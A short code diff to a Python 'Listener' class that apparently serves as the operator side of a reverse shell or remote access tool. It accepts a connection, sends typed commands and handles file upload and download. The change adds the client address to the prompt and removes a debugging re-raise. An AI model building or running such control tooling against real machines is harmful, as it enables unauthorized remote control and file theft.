@@ -56,7 +56,8 @@ class Listener(object):
         self.sock.listen(0)
         self.connection, self.address = self.sock.accept()
         while True:
-            cmd = input('>> ')
+            client_addr, client_port = self.connection.getpeername()
+            cmd = input(f'{client_addr} >> ')
             cmd = cmd.split(' ')
             try:
                 if cmd[0] == 'upload':
@@ -68,7 +69,6 @@ class Listener(object):
                 if cmd[0] == 'download' and '[-] Error' not in result:
                     result = self.write(cmd[1], result)
             except Exception as e:
-                raise e
                 result = f'[-] Error during command execution: \n\t{e}'
             print(result)
 
